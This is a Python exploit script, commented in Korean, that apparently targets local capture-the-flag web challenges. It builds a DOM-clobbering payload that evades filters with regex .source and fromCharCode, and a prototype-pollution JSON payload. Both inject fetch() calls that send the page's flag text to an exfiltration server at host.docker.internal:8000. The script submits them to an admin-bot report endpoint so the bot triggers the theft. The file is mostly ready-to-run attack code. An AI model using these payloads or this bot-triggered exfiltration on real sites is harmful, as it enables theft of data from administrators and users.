#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""domclobbering / prototype-pollution 자동 익스플로잇 (PHP, report.php).
?c= 페이로드 URL 을 report.php 로 제출 → 봇(admin·내부)이 방문 → flag 가 exfil_server 로 전송.

준비:  python exfil_server.py   (host:8000)
사용:  python client_misc.py domclobbering
       python client_misc.py prototype-pollution
그 후 exfil_server 콘솔에서 ?dc= / ?pp= 수신 확인.
"""
import sys, urllib.request, urllib.parse

EX = "http://host.docker.internal:8000"

CH = {
  "domclobbering": dict(port=9107, svc="domclobbering",
    # CLOB/isAdmin 클로버링 + (따옴표/슬래시 차단) 정규식 .source·fromCharCode 로 eval 페이로드
    c="/<form id=CLOB><input id=isAdmin>/;_=String.fromCharCode(0x2f);"
      "fetch(/http:/.source+_+_+/host.docker.internal:8000?dc=/.source+flag.innerText)"),
  "prototype-pollution": dict(port=9503, svc="prototype-pollution",
    c='{"__proto__":{"isAdmin":true,"code":"fetch(\'%s?pp=\'+flag.innerText)"}}' % EX),
}

def main():
    if len(sys.argv) < 2 or sys.argv[1] not in CH:
        print("usage: python client_misc.py [domclobbering|prototype-pollution]"); return
    c = CH[sys.argv[1]]
    visit = "http://%s:%d/?c=%s" % (c["svc"], c["port"], urllib.parse.quote(c["c"]))
    report = "http://localhost:%d/report.php" % c["port"]
    data = urllib.parse.urlencode({"url": visit}).encode()
    body = urllib.request.urlopen(report, data, timeout=15).read().decode("utf-8", "replace")
    print("[+] report.php 응답:", body.strip()[:40])
    print("[+] 봇 방문 URL:", visit)
    mark = "dc" if sys.argv[1] == "domclobbering" else "pp"
    print("[*] exfil_server 콘솔에서 ?%s= 수신 확인 (수 초 소요)." % mark)

if __name__ == "__main__":
    main()
